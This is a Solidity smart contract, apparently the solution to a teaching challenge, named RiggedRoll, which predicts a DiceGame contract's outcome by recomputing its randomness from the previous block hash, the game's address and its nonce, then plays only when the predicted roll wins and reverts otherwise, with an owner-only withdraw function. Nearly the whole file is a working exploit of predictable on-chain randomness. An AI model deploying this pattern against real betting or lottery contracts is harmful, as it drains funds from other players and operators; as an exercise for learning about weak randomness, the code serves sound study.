pragma solidity >=0.8.0 <0.9.0; // Do not change this line
// SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    receive() external payable {}

    function withdraw(address payable _to, uint256 amount) external onlyOwner {
        require(address(this).balance >= amount, "Not enough balance");
        _to.transfer(amount);
    }

    function riggedRoll() external {
        require(address(this).balance >= 0.002 ether, "Insufficient balance to roll");

        uint256 nonce = diceGame.nonce();
        bytes32 hash = keccak256(
            abi.encodePacked(blockhash(block.number - 1), address(diceGame), nonce)
        );
        uint256 roll = uint256(hash) % 16;

        console.log("Predicted roll:", roll);

        if (roll <= 5) {
            diceGame.rollTheDice{value: 0.002 ether}();
        } else {
            revert("Unfavorable roll, skipping.");
        }
    }
}
